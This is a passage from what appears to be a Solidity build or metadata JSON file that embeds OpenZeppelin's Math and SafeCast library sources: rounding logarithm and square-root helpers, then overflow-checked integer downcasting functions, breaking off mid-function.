}\\n\\n    /**\\n     * @dev Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && result * result < a);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 x) internal pure returns (uint256 r) {\\n        // If value has upper 128 bits set, log2 result is at least 128\\n        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;\\n        // If upper 64 bits of 128-bit half set, add 64 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;\\n        // If upper 32 bits of 64-bit half set, add 32 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;\\n        // If upper 16 bits of 32-bit half set, add 16 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;\\n        // If upper 8 bits of 16-bit half set, add 8 to result\\n        r |= SafeCast.toUint((x >> r) > 0xff) << 3;\\n        // If upper 4 bits of 8-bit half set, add 4 to result\\n        r |= SafeCast.toUint((x >> r) > 0xf) << 2;\\n\\n        // Shifts value right by the current result and use it as an index into this lookup table:\\n        //\\n        // | x (4 bits) |  index  | table[index] = MSB position |\\n        // |------------|---------|-----------------------------|\\n        // |    0000    |    0    |        table[0] = 0         |\\n        // |    0001    |    1    |        table[1] = 0         |\\n        // |    0010    |    2    |        table[2] = 1         |\\n        // |    0011    |    3    |        table[3] = 1         |\\n        // |    0100    |    4    |        table[4] = 2         |\\n        // |    0101    |    5    |        table[5] = 2         |\\n        // |    0110    |    6    |        table[6] = 2         |\\n        // |    0111    |    7    |        table[7] = 2         |\\n        // |    1000    |    8    |        table[8] = 3         |\\n        // |    1001    |    9    |        table[9] = 3         |\\n        // |    1010    |   10    |        table[10] = 3        |\\n        // |    1011    |   11    |        table[11] = 3        |\\n        // |    1100    |   12    |        table[12] = 3        |\\n        // |    1101    |   13    |        table[13] = 3        |\\n        // |    1110    |   14    |        table[14] = 3        |\\n        // |    1111    |   15    |        table[15] = 3        |\\n        //\\n        // The lookup table is represented as a 32-byte value with the MSB positions for 0-15 in the last 16 bytes.\\n        assembly (\\\"memory-safe\\\") {\\n            r := or(r, byte(shr(r, x), 0x0000010102020202030303030303030300000000000000000000000000000000))\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << result < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10 ** 64) {\\n                value /= 10 ** 64;\\n                result += 64;\\n            }\\n            if (value >= 10 ** 32) {\\n                value /= 10 ** 32;\\n                result += 32;\\n            }\\n            if (value >= 10 ** 16) {\\n                value /= 10 ** 16;\\n                result += 16;\\n            }\\n            if (value >= 10 ** 8) {\\n                value /= 10 ** 8;\\n                result += 8;\\n            }\\n            if (value >= 10 ** 4) {\\n                value /= 10 ** 4;\\n                result += 4;\\n            }\\n            if (value >= 10 ** 2) {\\n                value /= 10 ** 2;\\n                result += 2;\\n            }\\n            if (value >= 10 ** 1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 10 ** result < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 x) internal pure returns (uint256 r) {\\n        // If value has upper 128 bits set, log2 result is at least 128\\n        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;\\n        // If upper 64 bits of 128-bit half set, add 64 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;\\n        // If upper 32 bits of 64-bit half set, add 32 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;\\n        // If upper 16 bits of 32-bit half set, add 16 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;\\n        // Add 1 if upper 8 bits of 16-bit half set, and divide accumulated result by 8\\n        return (r >> 3) | SafeCast.toUint((x >> r) > 0xff);\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << (result << 3) < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.\\n     */\\n    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {\\n        return uint8(rounding) % 2 == 1;\\n    }\\n}\\n\",\"keccak256\":\"0x1225214420c83ebcca88f2ae2b50f053aaa7df7bd684c3e878d334627f2edfc6\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/SafeCast.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SafeCast.sol)\\n// This file was procedurally generated from scripts/generate/templates/SafeCast.js.\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Wrappers over Solidity's uintXX/intXX/bool casting operators with added overflow\\n * checks.\\n *\\n * Downcasting from uint256/int256 in Solidity does not revert on overflow. This can\\n * easily result in undesired exploitation or bugs, since developers usually\\n * assume that overflows raise errors. `SafeCast` restores this intuition by\\n * reverting the transaction when such an operation overflows.\\n *\\n * Using this library instead of the unchecked operations eliminates an entire\\n * class of bugs, so it's recommended to use it always.\\n */\\nlibrary SafeCast {\\n    /**\\n     * @dev Value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedUintDowncast(uint8 bits, uint256 value);\\n\\n    /**\\n     * @dev An int value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedIntToUint(int256 value);\\n\\n    /**\\n     * @dev Value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedIntDowncast(uint8 bits, int256 value);\\n\\n    /**\\n     * @dev An uint value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedUintToInt(uint256 value);\\n\\n    /**\\n     * @dev Returns the downcasted uint248 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint248).\\n     *\\n     * Counterpart to Solidity's `uint248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toUint248(uint256 value) internal pure returns (uint248) {\\n        if (value > type(uint248).max) {\\n            revert SafeCastOverflowedUintDowncast(248, value);\\n        }\\n        return uint248(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint240 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint240).\\n     *\\n     * Counterpart to Solidity's `uint240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toUint240(uint256 value) internal pure returns (uint240) {\\n        if (value > type(uint240).max) {\\n            revert SafeCastOverflowedUintDowncast(240, value);\\n        }\\n        return uint240(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint232 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint232).\\n     *\\n     * Counterpart to Solidity's `uint232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toUint232(uint256 value) internal pure returns (uint232) {\\n        if (value > type(uint232).max) {\\n            revert SafeCastOverflowedUintDowncast(232, value);\\n        }\\n        return uint232(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint224 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint224).\\n     *\\n     * Counterpart to Solidity's `uint224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toUint224(uint256 value) internal pure returns (uint224) {\\n        if (value > type(uint224).max) {\\n            revert SafeCastOverflowedUintDowncast(224, value);\\n        }\\n        return uint224(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint216 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint216).\\n     *\\n     * Counterpart to Solidity's `uint216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toUint216(uint256 value) internal pure returns (uint216) {\\n        if (value > type(uint216).max) {\\n            revert SafeCastOverflowedUintDowncast(216, value);\\n        }\\n        return uint216(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint208 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint208).\\n     *\\n     * Counterpart to Solidity's `uint208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toUint208(uint256 value) internal pure returns (uint208) {\\n        if (value > type(uint208).max) {\\n            revert SafeCastOverflowedUintDowncast(208, value);\\n        }\\n        return uint208(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint200 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint200).\\n     *\\n     * Counterpart to Solidity's `uint200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toUint200(uint256 value) internal pure returns (uint200) {\\n        if (value > type(uint200).max) {\\n            revert SafeCastOverflowedUintDowncast(200, value);\\n        }\\n        return uint200(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint192 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint192).\\n     *\\n     * Counterpart to Solidity's `uint192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toUint192(uint256 value) internal pure returns (uint192) {\\n        if (value > type(uint192).max) {\\n            revert SafeCastOverflowedUintDowncast(192, value);\\n        }\\n        return uint192(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint184 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint184).\\n     *\\n     * Counterpart to Solidity's `uint184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toUint184(uint256 value) internal pure returns (uint184) {\\n        if (value > type(uint184).max) {\\n            revert SafeCastOverflowedUintDowncast(184, value);\\n        }\\n        return uint184(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint176 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint176).\\n     *\\n     * Counterpart to Solidity's `uint176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toUint176(uint256 value) internal pure returns (uint176) {\\n        if (value > type(uint176).max) {\\n            revert SafeCastOverflowedUintDowncast(176, value);\\n        }\\n        return uint176(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint168 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint168).\\n     *\\n     * Counterpart to Solidity's `uint168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toUint168(uint256 value) internal pure returns (uint168) {\\n        if (value > type(uint168).max) {\\n            revert SafeCastOverflowedUintDowncast(168, value);\\n        }\\n        return uint168(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint160 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint160).\\n     *\\n     * Counterpart to Solidity's `uint160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toUint160(uint256 value) internal pure returns (uint160) {\\n        if (value > type(uint160).max) {\\n            revert SafeCastOverflowedUintDowncast(160, value);\\n        }\\n        return uint160(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint152 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint152).\\n     *\\n     * Counterpart to Solidity's `uint152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toUint152(uint256 value) internal pure returns (uint152) {\\n        if (value > type(uint152).max) {\\n            revert SafeCastOverflowedUintDowncast(152, value);\\n        }\\n        return uint152(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint144 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint144).\\n     *\\n     * Counterpart to Solidity's `uint144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toUint144(uint256 value) internal pure returns (uint144) {\\n        if (value > type(uint144).max) {\\n            revert SafeCastOverflowedUintDowncast(144, value);\\n        }\\n        return uint144(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint136 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint136).\\n     *\\n     * Counterpart to Solidity's `uint136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toUint136(uint256 value) internal pure returns (uint136) {\\n        if (value > type(uint136).max) {\\n            revert SafeCastOverflowedUintDowncast(136, value);\\n        }\\n        return uint136(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint128 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint128).\\n     *\\n     * Counterpart to Solidity's `uint128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toUint128(uint256 value) internal pure returns (uint128) {\\n        if (value > type(uint128).max) {\\n            revert SafeCastOverflowedUintDowncast(128, value);\\n        }\\n        return uint128(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint120 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint120).\\n     *\\n     * Counterpart to Solidity's `uint120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toUint120(uint256 value) internal pure returns (uint120) {\\n        if (value > type(uint120).max) {\\n            revert SafeCastOverflowedUintDowncast(120, value);\\n        }\\n        return uint120(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint112 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint112).\\n     *\\n     * Counterpart to Solidity's `uint112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toUint112(uint256 value) internal pure returns (uint112) {\\n        if (value > type(uint112).max) {\\n            revert SafeCastOverflowedUintDowncast(112, value);\\n        }\\n        return uint112(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint104 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint104).\\n     *\\n     * Counterpart to Solidity's `uint104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toUint104(uint256 value) internal pure returns (uint104) {\\n        if (value > type(uint104).max) {\\n            revert SafeCastOverflowedUintDowncast(104, value);\\n        }\\n        return uint104(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint96 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint96).\\n     *\\n     * Counterpart to Solidity's `uint96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toUint96(uint256 value) internal pure returns (uint96) {\\n        if (value > type(uint96).max) {\\n            revert SafeCastOverflowedUintDowncast(96, value);\\n        }\\n        return uint96(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint88 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint88).\\n     *\\n     * Counterpart to Solidity's `uint88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toUint88(uint256 value) internal pure returns (uint88) {\\n        if (value > type(uint88).max) {\\n            revert SafeCastOverflowedUintDowncast(88, value);\\n        }\\n        return uint88(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint80 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint80).\\n     *\\n     * Counterpart to Solidity's `uint80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toUint80(uint256 value) internal pure returns (uint80) {\\n        if (value > type(uint80).max) {\\n            revert SafeCastOverflowedUintDowncast(80, value);\\n        }\\n        return uint80(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint72 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint72).\\n     *\\n     * Counterpart to Solidity's `uint72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toUint72(uint256 value) internal pure returns (uint72) {\\n        if (value > type(uint72).max) {\\n            revert SafeCastOverflowedUintDowncast(72, value);\\n        }\\n        return uint72(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint64 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint64).\\n     *\\n     * Counterpart to Solidity's `uint64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toUint64(uint256 value) internal pure returns (uint64) {\\n        if (value > type(uint64).max) {\\n            revert SafeCastOverflowedUintDowncast(64, value);\\n        }\\n        return uint64(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint56 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint56).\\n     *\\n     * Counterpart to Solidity's `uint56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toUint56(uint256 value) internal pure returns (uint56) {\\n        if (value > type(uint56).max) {\\n            revert SafeCastOverflowedUintDowncast(56, value);\\n        }\\n        return uint56(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint48 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint48).\\n     *\\n     * Counterpart to Solidity's `uint48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toUint48(uint256 value) internal pure returns (uint48) {\\n        if (value > type(uint48).max) {\\n            revert SafeCastOverflowedUintDowncast(48, value);\\n        }\\n        return uint48(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint40 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint40).\\n     *\\n     * Counterpart to Solidity's `uint40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toUint40(uint256 value) internal pure returns (uint40) {\\n        if (value > type(uint40).max) {\\n            revert SafeCastOverflowedUintDowncast(40, value);\\n        }\\n        return uint40(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint32 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint32).\\n     *\\n     * Counterpart to Solidity's `uint32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toUint32(uint256 value) internal pure returns (uint32) {\\n        if (value > type(uint32).max) {\\n            revert SafeCastOverflowedUintDowncast(32, value);\\n        }\\n        return uint32(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint24 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint24).\\n     *\\n     * Counterpart to Solidity's `uint24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toUint24(uint256 value) internal pure returns (uint24) {\\n        if (value > type(uint24).max) {\\n            revert SafeCastOverflowedUintDowncast(24, value);\\n        }\\n        return uint24(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint16 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint16).\\n     *\\n     * Counterpart to Solidity's `uint16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toUint16(uint256 value) internal pure returns (uint16) {\\n        if (value > type(uint16).max) {\\n            revert SafeCastOverflowedUintDowncast(16, value);\\n        }\\n        return uint16(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint8 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint8).\\n     *\\n     * Counterpart to Solidity's `uint8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toUint8(uint256 value) internal pure returns (uint8) {\\n        if (value > type(uint8).max) {\\n            revert SafeCastOverflowedUintDowncast(8, value);\\n        }\\n        return uint8(value);\\n    }\\n\\n    /**\\n     * @dev Converts a signed int256 into an unsigned uint256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be greater than or equal to 0.\\n     */\\n    function toUint256(int256 value) internal pure returns (uint256) {\\n        if (value < 0) {\\n            revert SafeCastOverflowedIntToUint(value);\\n        }\\n        return uint256(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int248 from int256, reverting on\\n     * overflow (when the input is less than smallest int248 or\\n     * greater than largest int248).\\n     *\\n     * Counterpart to Solidity's `int248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toInt248(int256 value) internal pure returns (int248 downcasted) {\\n        downcasted = int248(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(248, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int240 from int256, reverting on\\n     * overflow (when the input is less than smallest int240 or\\n     * greater than largest int240).\\n     *\\n     * Counterpart to Solidity's `int240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toInt240(int256 value) internal pure returns (int240 downcasted) {\\n        downcasted = int240(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(240, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int232 from int256, reverting on\\n     * overflow (when the input is less than smallest int232 or\\n     * greater than largest int232).\\n     *\\n     * Counterpart to Solidity's `int232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toInt232(int256 value) internal pure returns (int232 downcasted) {\\n        downcasted = int232(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(232, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int224 from int256, reverting on\\n     * overflow (when the input is less than smallest int224 or\\n     * greater than largest int224).\\n     *\\n     * Counterpart to Solidity's `int224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toInt224(int256 value) internal pure returns (int224 downcasted) {\\n        downcasted = int224(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(224, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int216 from int256, reverting on\\n     * overflow (when the input is less than smallest int216 or\\n     * greater than largest int216).\\n     *\\n     * Counterpart to Solidity's `int216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toInt216(int256 value) internal pure returns (int216 downcasted) {\\n        downcasted = int216(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(216, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int208 from int256, reverting on\\n     * overflow (when the input is less than smallest int208 or\\n     * greater than largest int208).\\n     *\\n     * Counterpart to Solidity's `int208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toInt208(int256 value) internal pure returns (int208 downcasted) {\\n        downcasted = int208(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(208, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int200 from int256, reverting on\\n     * overflow (when the input is less than smallest int200 or\\n     * greater than largest int200).\\n     *\\n     * Counterpart to Solidity's `int200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toInt200(int256 value) internal pure returns (int200 downcasted) {\\n        downcasted = int200(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(200, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int192 from int256, reverting on\\n     * overflow (when the input is less than smallest int192 or\\n     * greater than largest int192).\\n     *\\n     * Counterpart to Solidity's `int192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toInt192(int256 value) internal pure returns (int192 downcasted) {\\n        downcasted = int192(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(192, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int184 from int256, reverting on\\n     * overflow (when the input is less than smallest int184 or\\n     * greater than largest int184).\\n     *\\n     * Counterpart to Solidity's `int184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toInt184(int256 value) internal pure returns (int184 downcasted) {\\n        downcasted = int184(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(184, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int176 from int256, reverting on\\n     * overflow (when the input is less than smallest int176 or\\n     * greater than largest int176).\\n     *\\n     * Counterpart to Solidity's `int176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toInt176(int256 value) internal pure returns (int176 downcasted) {\\n        downcasted = int176(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(176, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int168 from int256, reverting on\\n     * overflow (when the input is less than smallest int168 or\\n     * greater than largest int168).\\n     *\\n     * Counterpart to Solidity's `int168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toInt168(int256 value) internal pure returns (int168 downcasted) {\\n        downcasted = int168(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(168, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int160 from int256, reverting on\\n     * overflow (when the input is less than smallest int160 or\\n     * greater than largest int160).\\n     *\\n     * Counterpart to Solidity's `int160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toInt160(int256 value) internal pure returns (int160 downcasted) {\\n        downcasted = int160(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(160, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int152 from int256, reverting on\\n     * overflow (when the input is less than smallest int152 or\\n     * greater than largest int152).\\n     *\\n     * Counterpart to Solidity's `int152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toInt152(int256 value) internal pure returns (int152 downcasted) {\\n        downcasted = int152(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(152, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int144 from int256, reverting on\\n     * overflow (when the input is less than smallest int144 or\\n     * greater than largest int144).\\n     *\\n     * Counterpart to Solidity's `int144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toInt144(int256 value) internal pure returns (int144 downcasted) {\\n        downcasted = int144(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(144, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int136 from int256, reverting on\\n     * overflow (when the input is less than smallest int136 or\\n     * greater than largest int136).\\n     *\\n     * Counterpart to Solidity's `int136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toInt136(int256 value) internal pure returns (int136 downcasted) {\\n        downcasted = int136(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(136, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int128 from int256, reverting on\\n     * overflow (when the input is less than smallest int128 or\\n     * greater than largest int128).\\n     *\\n     * Counterpart to Solidity's `int128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toInt128(int256 value) internal pure returns (int128 downcasted) {\\n        downcasted = int128(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(128, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int120 from int256, reverting on\\n     * overflow (when the input is less than smallest int120 or\\n     * greater than largest int120).\\n     *\\n     * Counterpart to Solidity's `int120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toInt120(int256 value) internal pure returns (int120 downcasted) {\\n        downcasted = int120(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(120, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int112 from int256, reverting on\\n     * overflow (when the input is less than smallest int112 or\\n     * greater than largest int112).\\n     *\\n     * Counterpart to Solidity's `int112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toInt112(int256 value) internal pure returns (int112 downcasted) {\\n        downcasted = int112(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(112, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int104 from int256, reverting on\\n     * overflow (when the input is less than smallest int104 or\\n     * greater than largest int104).\\n     *\\n     * Counterpart to Solidity's `int104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toInt104(int256 value) internal pure returns 